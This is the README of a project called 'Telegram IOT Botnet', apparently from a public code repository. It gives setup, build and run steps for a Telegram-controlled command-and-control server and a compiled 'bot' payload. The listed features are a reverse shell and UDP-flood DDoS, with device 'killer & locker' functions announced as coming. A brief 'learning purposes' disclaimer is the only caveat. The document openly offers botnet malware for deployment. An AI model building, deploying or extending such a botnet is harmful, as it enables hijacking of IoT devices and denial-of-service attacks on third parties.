# Telegram IOT Botnet

Telegram IOT Botnet was created for learning purposes. Please do not use for malicious purposes!

## Getting Started

### Dependencies

* C&C Server need VPS Ubuntu 20.04 (1GB 1 CORES ITS OK LOL)

### Installing

```sh
apt-get update -y
apt-get upgrade -y
apt-get install gcc python3 python3-pip -y
pip3 install python-telegram-bot threading
```

### Editing

* Edit IP server in main.c
* Edit Telegram Bot Token in cnc.py

### Building and Running

* gcc bot/*.c -o bot
* python3 cnc.py
* "bot" is payload file

### Functions

- Reverse Shell
- DDoS (udpflood, soon)
- Ensure Bots (soon)
- Killer & Locker (soon)
- If you have ideas, create Issue and write its. Thanks you ❤️

## Authors

* hoaan1995

## Version History

* 0.1
    * Initial Release
